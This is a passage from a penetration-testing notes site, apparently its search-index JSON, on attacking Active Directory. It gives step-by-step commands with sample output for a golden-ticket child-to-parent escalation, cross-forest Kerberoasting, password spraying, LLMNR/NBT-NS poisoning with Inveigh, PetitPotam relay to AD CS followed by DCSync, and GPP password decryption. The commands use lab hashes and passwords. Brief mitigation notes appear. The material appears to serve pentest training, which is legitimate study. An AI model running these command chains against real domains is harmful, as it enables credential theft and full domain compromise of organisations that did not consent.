(SidTypeGroup)\n</code></pre></p> <p>As the domain SID was: <code>S-1-5-21-3842939050-3880317879-2865463114</code> and the RID is <code>519</code>, the SID of \"Enterprise Admin\" group is <code>S-1-5-21-3842939050-3880317879-2865463114-519</code> .</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#step-6-generate-a-golden-ticket","title":"Step 6: Generate a golden ticket","text":"<p>Next, we can use\u00a0ticketer.py\u00a0from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by\u00a0<code>-domain-sid</code>) and the parent domain (specified by\u00a0<code>-extra-sid</code>).</p> <pre><code>ticketer.py -nthash $KRBTGThashOfChildDomain -domain $targetedDomain -domain-sid $sidDomain -extra-sid $SIDofEnterpriseAdminGroup $madeupUserName\n# Example:\n# ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker\n</code></pre> <p>The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials:</p> <pre><code>[*] Saving ticket in hacker.ccache\n</code></pre> <p>Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.</p> <pre><code>export KRB5CCNAME=hacker.ccache \n</code></pre> <p>We can check if we can successfully authenticate to the parent domain's Domain Controller using\u00a0Impacket's version of Psexec. If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.</p> <pre><code>psexec.py $targetedDomain/$madeupUser@$hostNameDC.$ParentDomain -k -no-pass -target-ip $DomainControllerIP\n# Example:\n# psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5\n# Enter password: HTB_@cademy_stdnt_admin!\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#step-7-privilege-escalation","title":"Step 7: Privilege escalation","text":"<p>Impacket also has the tool\u00a0raiseChild.py, which will automate escalating from child to parent domain.</p> <p>We need to specify the target domain controller and credentials for an administrative user in the child domain. </p> <pre><code>raiseChild.py -target-exec $DomainControllerIP  $TargetedDomain/$UserWithAdminPriv\n# Example:\n# raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm\n# Enter password: HTB_@cademy_stdnt_admin!\n# target-exec: If specified, then it will authenticate to the parent domain's Domain Controller via Psexec.\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#step-8-accessing-another-user-on-domain","title":"Step 8: Accessing another user on domain","text":"<p>The following will reproduce the entire attack:</p> <pre><code>#### Step 1: getting the KRBTGT hash for the child domain\nsecretsdump.py $targetedDomain/$UserWithAdminPriv@$TargetedIP -just-dc-user $NetbiosNameofDomain/krbtgt\n\n# Example:\n# secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt\n# Enter password: HTB_@cademy_stdnt_admin!\n# Results: 9d765b482771505cbe97411065964d5f\n#### \n\n#### Step 2: getting the SID for the child domain. Obtain the SID for the domain and the RIDs for each user and group and filter out by Domain SID\nlookupsid.py $targetedDomain/$UserWithAdminPriv@TargetedIP | grep \"Domain SID\"\n\n# Example:\n# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\"\n# Enter password: HTB_@cademy_stdnt_admin!\n# Results:  S-1-5-21-2806153819-209893948-922872689\n####\n\n#### Step 3: getting the name of a target user in the child domain (does not need to exist!)\nhacker\n####\n\n#### Step 4: getting the FQDN of the child domain.\nlogistics.inlanefreight.local\n####\n\n#### Step 5: getting the SID of the Enterprise Admins group of the root domain\nlookupsid.py $targetedDomain/$UserWithAdminPriv@$DomainControllerIP | grep \"Enterprise Admins\"\n# Example:\n# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep \"Enterprise Admins\"\n# Enter password: HTB_@cademy_stdnt_admin!\n# Results: 519: INLANEFREIGHT\\Enterprise Admins (SidTypeGroup)\n####\n\n#### Step 6: Generate a golden ticket \nticketer.py -nthash $KRBTGThashOfChildDomain -domain $targetedDomain -domain-sid $sidDomain -extra-sid $SIDofEnterpriseAdminGroup $madeupUserName\n# Example:\n# ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker\n\n# The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials:\n[*] Saving ticket in hacker.ccache\n\n# Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.\nexport KRB5CCNAME=hacker.ccache \n####\n\n#### Step 7: Accessing another user on domain\n# With one user, we will request the NTLM hash for another user\nsecretsdump.py $ControlledUsername@$hostnameController.$Parentdomain -k -no-pass -just-dc-ntlm -just-dc-user $targetUsername\n# Example:\n# secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#cross-forest-kerberoasting","title":"\ud83c\udf33 Cross-Forest Kerberoasting","text":"<p>Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains. \u00a0 To do this, we need credentials for a user that can authenticate into the other domain and specify the\u00a0<code>-target-domain</code>\u00a0flag in our command. \u00a0 <pre><code>GetUserSPNs.py -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName\n# Example:\n# GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley\n# Enter password: transporter@4\n</code></pre></p> <p>Rerunning the command with the\u00a0<code>-request</code>\u00a0flag added gives us the TGS ticket.</p> <pre><code>GetUserSPNs.py -request -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName\n# Example:\n# GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley\n# Enter password: transporter@4\n</code></pre> <p>Now, with those TGS we could try to crack them offline</p> <pre><code>hashcat -m 13100 tickettocrack /usr/share/wordlists/rockyou.txt  \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-privilege-escalation/#hunting-foreign-group-membership-with-bloodhound-python","title":"\ud83d\udc07 Hunting Foreign Group Membership with Bloodhound-python","text":"<p>we may, from time to time, see users or admins from one domain as members of a group in another domain. \u00a0Since only\u00a0<code>Domain Local Groups</code>\u00a0allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship.</p> <p>If we are testing from a Linux host, we can gather this information by using the\u00a0Python implementation of BloodHound.</p> <p>Collecting information from INLANEFREIGHT.LOCAL</p> <pre><code>sudo nano /etc/resolv.conf \n</code></pre> <p>Modify the file so it will have the following entries:</p> <pre><code>#nameserver 1.1.1.1\n#nameserver 8.8.8.8\ndomain INLANEFREIGHT.LOCAL\nnameserver 172.16.5.5\n</code></pre> <p>Running bloodhound-python Against INLANEFREIGHT.LOCAL:</p> <pre><code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2\n</code></pre> <p>We can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.</p> <pre><code>zip -r ilfreight_bh.zip *.json\n</code></pre> <p>Collecting information from INLANEFREIGHT.LOCAL</p> <pre><code>sudo nano /etc/resolv.conf \n</code></pre> <p>Modify the file so it will have the following entries:</p> <pre><code>#nameserver 1.1.1.1\n#nameserver 8.8.8.8\ndomain FREIGHTLOGISTICS.LOCAL\nnameserver 172.16.5.238\n</code></pre> <p>Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL</p> <pre><code>bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2\n</code></pre> <p>We can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.</p> <pre><code>zip -r FREIGHTLOGISTICS.zip *.json\n</code></pre> <p>Transfer the files to your attacker machine, open Bloodhound in your attacker machine, upload the zip. Now we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.</p> <p></p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/","title":"Attacking Active Directory from Windows","text":"<p>Index of Active Directory</p> <p>Attacking from linux</p> <ul> <li>Enumerating Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Privileges escalation in Active Directory from Linux</li> </ul> <p>Attacking from Windows</p> <ul> <li>Enumerating Active Directory from Windows</li> <li>Attacking Active Directory from Windows</li> <li>Privileges escalation in Active Directory from Windows</li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#password-spraying","title":"\ud83c\udf65 Password spraying","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#domainpasswordspray","title":"DomainPasswordSpray","text":"<p>See DomainPasswordSpray</p> <pre><code>Import-Module .\\DomainPasswordSpray.ps1\n\n# Authenticated in the domain:\nInvoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.\n\n# Not authenticated in the domain:\nInvoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#kerbrute","title":"kerbrute","text":"<pre><code>./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#crackmapexec","title":"crackmapexec","text":"<pre><code># Spraying password with crackmapexec\ncrackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +\n# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list\n# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.\n# -H: hash\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#mitigation-techniques-against-password-spraying","title":"Mitigation techniques against password spraying","text":"<ul> <li>Multi-factor Authentication   </li> <li>Restricting Access</li> <li>Reducing Impact of Successful Exploitation</li> <li>Password Hygiene</li> </ul> <p>In the Domain Controller\u2019s security log, many instances of event ID\u00a04625: An account failed to log on\u00a0over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID\u00a04771: Kerberos pre-authentication failed, which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This\u00a0post\u00a0details research around detecting password spraying using Windows Security Event Logging.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#llmnrnbt-ns-poisoning","title":"\ud83d\udc8c LLMNR/NBT-NS Poisoning","text":"<p>See more. </p> <p>Link-Local Multicast Name Resolution\u00a0(LLMNR) and\u00a0NetBIOS Name Service\u00a0(NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.</p> <p>If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.</p> <p>It uses port\u00a0<code>5355</code>\u00a0over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port\u00a0<code>137</code>\u00a0over UDP.</p> <p>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with\u00a0<code>Responder</code>\u00a0to poison these requests.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#how-does-a-typical-attack-work","title":"How does a typical attack work","text":"<ol> <li>A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.</li> <li>The DNS server responds, stating that this host is unknown.</li> <li>The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.</li> <li>The attacker (us with\u00a0<code>Responder</code>\u00a0running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.</li> <li>The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.</li> <li>This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.</li> </ol>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#tools","title":"Tools","text":"<p>Several tools can be used to attempt LLMNR &amp; NBT-NS poisoning:</p> Tool Description Responder Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. Inveigh Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks. Metasploit Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#inveigh","title":"Inveigh","text":"<p>https://github.com/Kevin-Robertson/Inveigh</p> <p>Mitre ATT&amp;CK lists this technique as\u00a0ID: T1557.001,\u00a0<code>Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay</code>.</p> <p>LLMNR &amp; NBT-NS poisoning is possible from a Windows host as well. </p> <p>Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. The repo contains the primary C# version as well as the legacy PowerShell version.</p> <p>Inveigh can listen to IPv4 and IPv6 and several other protocols, including\u00a0<code>LLMNR</code>, DNS,\u00a0<code>mDNS</code>, NBNS,\u00a0<code>DHCPv6</code>, ICMPv6,\u00a0<code>HTTP</code>, HTTPS,\u00a0<code>SMB</code>, LDAP,\u00a0<code>WebDAV</code>, and Proxy Auth.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#powershell-version","title":"Powershell version","text":"<p>The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version (in the belowed section). Configurable parameters in inveigh: https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters</p> <pre><code># Install the module\nImport-Module .\\Inveigh.ps1\n\n# List parameters\n(Get-Command Invoke-Inveigh).Parameters\n\n# Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.\nInvoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#c-inveigh-inveighzero","title":"C# Inveigh (InveighZero)","text":"<p>Before we can use the C# version of the tool, we have to compile the executable. </p> <pre><code>.\\Inveigh.exe\n</code></pre> <p>Results:</p> <pre><code>[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]\n[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]\n[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]\n[ ] DHCPv6\n[+] DNS Packet Sniffer [Type A]\n[ ] ICMPv6\n[+] LLMNR Packet Sniffer [Type A]\n[ ] MDNS\n[ ] NBNS\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n[ ] HTTPS\n[+] WebDAV [WebDAVAuth NTLM]\n[ ] Proxy\n[+] LDAP Listener [Port 389]\n[+] SMB Packet Sniffer [Port 445]\n[+] File Output [C:\\Tools]\n[+] Previous Session Files (Not Found)\n[*] Press ESC to enter/exit interactive console\n[!] Failed to start HTTP listener on port 80, check IP and port usage.\n[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from \n</code></pre> <ul> <li><code>[+]</code>\u00a0 default option and enabled by default</li> <li><code>[ ]</code>\u00a0 disabled options .</li> </ul> <p>Console access: </p> <p>Press ESC to enter/exit interactive console. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.</p> <pre><code># List commands\n&gt; HELP\n\n# view unique captured hashes\n&gt; \u00a0GET NTLMV2UNIQUE\n\n#  see which usernames we have collected.\nGET NTLMV2USERNAMES\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#zerologon","title":"\u274c Zerologon","text":"<p>See https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#dcshadow","title":"\u26d3\ufe0f DCShadow","text":"<p>See https://blog.netwrix.com/2022/09/28/dcshadow_attack/</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#petitpotam-ms-efsrpc","title":"\ud83c\udf5f PetitPotam (MS-EFSRPC)","text":"<p>! tips \"\"     - NTLM relaying to AD CS - On certificates, printers and a little hippo</p> <p>PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the\u00a0Local Security Authority Remote Protocol (LSARPC)\u00a0by abusing Microsoft\u2019s\u00a0Encrypting File System Remote Protocol (MS-EFSRPC).</p> <p>This technique allows an unauthenticated attacker to take over a Windows domain where\u00a0Active Directory Certificate Services (AD CS)\u00a0is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate.</p> <p>This certificate can then be used with a tool such as\u00a0<code>Rubeus</code>\u00a0or\u00a0<code>gettgtpkinit.py</code>\u00a0from\u00a0PKINITtools\u00a0to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.</p> <p>First off, we need to start\u00a0<code>ntlmrelayx.py</code>\u00a0in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as\u00a0certi\u00a0to attempt to locate it.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#step-1-capture-the-base64-certificate","title":"Step 1: capture the base64 certificate","text":"<pre><code># Access the host machine. For instance with ssh\nssh $user@$ip\n\n# Start ntlmrelayx.py\nsudo ntlmrelayx.py -debug -smb2support --target http://$hostname.$domain/certsrv/certfnsh.asp --adcs --template DomainController\n# Example:\n# sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController\n</code></pre> <p>In another terminal connected via ssh with the host machine, user \u00a0PetitPotam.py.</p> <pre><code>git clone https://github.com/topotam/PetitPotam.git\n</code></pre> <pre><code># Run this tool to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running\npython3 PetitPotam.py $HostIP $DomainControllerIP       \n# Example:\n# python3 PetitPotam.py 172.16.5.225 172.16.5.5       \n</code></pre> <p>In the terminal with the <code>ntlmrelayx.py</code>\u00a0 running we will see the base64 encoded certificate for the Domain Controller if the attack is successful.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#step-2-request-a-tgt","title":"Step 2: Request a TGT","text":"<p>Next step, \u00a0we can take this base64 certificate and use\u00a0<code>gettgtpkinit.py</code>\u00a0to request a Ticket-Granting-Ticket (TGT) for the domain controller:</p> <pre><code>python3 /opt/PKINITtools/gettgtpkinit.py $domain/$host\\$ -pfx-base64 $base64EncodedCertificate filename.ccache\n# Example:\n# python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGS...SNIP...QQIgaSODoMHZaA= dc01.ccache\n# \u00a0`dc01.ccache`\u00a0file: The TGT requested above was saved down to this file\n</code></pre> <p>Set the KRB5CCNAME environment variable, so our attack host uses the\u00a0<code>dc01.ccache</code>\u00a0file for Kerberos authentication attempts.</p> <pre><code>export KRB5CCNAME=filename.ccache\n# Example:\n# export KRB5CCNAME=dc01.ccache\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#step-3-retrieve-ntlm-password-hashes-with-dcsync-attack","title":"Step 3: Retrieve NTLM password hashes with DCSync attack","text":"<p>Use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.</p> <pre><code>secretsdump.py -just-dc-user $domain/administrator -k -no-pass \"$hostName\"@$hostName.$domain\n# Example:\n# secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n</code></pre> <p>We can see this by typing\u00a0<code>klist</code>\u00a0(using the\u00a0<code>klist</code>\u00a0command requires installation of the\u00a0krb5-user\u00a0package on our attack host. </p> <pre><code>klist\n# Results:\n# Ticket cache: FILE:dc01.ccache\n# Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL\n# Valid starting       Expires              Service principal\n# 04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL\n</code></pre> <p>Confirming Admin Access to the Domain Controller. Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller:</p> <pre><code>crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#optional-path-1-submit-a-tgs-for-ourselves","title":"Optional path #1: Submit a TGS for ourselves","text":"<p>Submitting a TGS Request for Ourselves Using getnthash.py</p> <p>We can also take an alternate route once we have the TGT for our target. Using the tool\u00a0<code>getnthash.py</code>\u00a0from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the\u00a0Privileged Attribute Certificate (PAC)\u00a0which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.</p> <pre><code>python /opt/PKINITtools/getnthash.py -key $minikerberosTGTHash $domain$/$hostname$\n# Example:\n# python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$\n# The $minikerberosTGTHash is obtained from the output of gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.\n</code></pre> <p>Submitting a TGS Request for Ourselves Using getnthash.py</p> <pre><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#optional-path-2-rubeus-to-generate-tgt-and-tgs","title":"Optional path #2: rubeus to generate TGT and TGS","text":"<p>once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.</p> <p>Setting the KRB5CCNAME Environment Variable</p> <pre><code>.\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$  /certificate:MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEn... SNIP...J4ihw= /ptt\n</code></pre> <p>We can then type klist to confirm that the ticket is in memory.</p> <pre><code>klist\n</code></pre> <p>since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host.</p> <pre><code>cd .\\mimikatz\\x64\\\n.\\mimikatz.exe\nlsadump::dcsync /user:inlanefreight\\krbtgt\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#petitpotam-mitigations","title":"PetitPotam Mitigations","text":"<p>First off, the patch for\u00a0CVE-2021-36942\u00a0should be applied to any affected hosts. Below are some further hardening steps that can be taken:</p> <ul> <li>To prevent NTLM relay attacks, use\u00a0Extended Protection for Authentication\u00a0along with enabling\u00a0Require SSL\u00a0to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services</li> <li>Disabling NTLM authentication\u00a0for Domain Controllers</li> <li>Disabling NTLM on AD CS servers using\u00a0Group Policy</li> <li>Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use.</li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#sniffing-ldap-credentials","title":"\ud83d\udc43 Sniffing LDAP Credentials","text":"<p>Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a\u00a0<code>test connection</code>\u00a0function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a\u00a0<code>netcat</code>\u00a0listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#group-policy-preferences-gpp-passwords","title":"\ud83d\udc65 Group Policy Preferences (GPP) Passwords","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p> <ul> <li>Map drives (drives.xml)</li> <li>Create local users</li> <li>Create printer config files (printers.xml)</li> <li>Creating and updating services (services.xml)</li> <li>Creating scheduled tasks (scheduledtasks.xml)</li> <li>Changing local admin passwords.</li> </ul> <p>These files can contain an array of configuration data and defined passwords. The\u00a0<code>cpassword</code>\u00a0attribute value is AES-256 bit encrypted, but Microsoft\u00a0published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</p> <p>This was patched in 2014\u00a0MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p> <p>In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the \u201ccpassword\u201d parameter that can get decrypted with Microsoft\u2019s public AES key (link). If you retrieve the cpassword value more manually, the\u00a0<code>gpp-decrypt</code>\u00a0utility can be used to decrypt the password as follows:</p> <pre><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre> <p>Locating &amp; Retrieving GPP Passwords with CrackMapExec</p> <pre><code>crackmapexec smb -L | grep gpp\n</code></pre> <p>To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules \u2014\u00a0<code>**gpp_password**</code>\u00a0and\u00a0<code>**gpp_autologin**</code>\u00a0modules. The\u00a0<code>**gpp_password**</code>\u00a0decrypts passwords stored in the Group.xml file, while\u00a0<code>**gpp_autologin**</code>\u00a0retrieves autologin information from the Registry.xml file in the preferences folder.</p> <pre><code>crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin\n# Example:\n# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\n</code></pre> <p>Results: <pre><code>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']\n</code></pre></p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#group-policy-object-abuse","title":"Group Policy Object Abuse","text":"<p>We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use\u00a0group3r,\u00a0ADRecon,\u00a0PingCastle, among others, to audit the security of GPOs in a domain.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-attacks/#powershell","title":"Powershell","text":"<p>If Group Policy Management Tools are installed on the host we are working from, we can use various built-in\u00a0GroupPolicy cmdlets\u00a0such as\u00a0<code>Get-GPO</code>\u00a0to perform the same enumeration.</p> <pre><code>Get-GPO -All | Select 